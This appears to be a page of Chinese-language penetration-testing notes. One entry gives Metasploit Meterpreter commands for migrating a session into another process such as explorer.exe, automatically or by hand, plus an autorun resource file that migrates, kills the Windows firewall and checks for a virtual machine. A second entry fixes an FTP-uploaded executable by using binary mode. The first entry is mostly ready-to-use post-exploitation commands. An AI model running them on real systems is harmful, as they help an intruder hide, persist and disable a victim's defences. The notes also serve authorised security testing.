entry.title: meterpreter进程迁移
entry.content:
自动迁移
set autorunscript migrate -n explorer.exe
set AutoRunscript migrate -f

自动批量执行
set AutoRunScript post/multi/manage/multi_post MACRO=/root/autoruncommands.rc
set AutoRunScript multi_console_command -r /root/autoruncommands.rc

#autoruncommands.rc
run post/windows/manage/migrate
run post/windows/manage/killfw
run post/windows/gather/checkvm

手动迁移
migrate -N 进程名
migrate -P 进程编号

其他方法
show advanced 参考：Hiding Shell using PrependMigrate -Metasploit

entry.title: This program cannot be run in DOS mode.
entry.content:
问题：通过ftp上传的exe执行时提示“This program cannot be run in DOS mode.”

解决方法：检查ftp传输模式，设置成binary模式上传即可

参考：https://security.stackexchange.com/questions/133946/this-program-can-not-be-run-in-dos-mode/133966
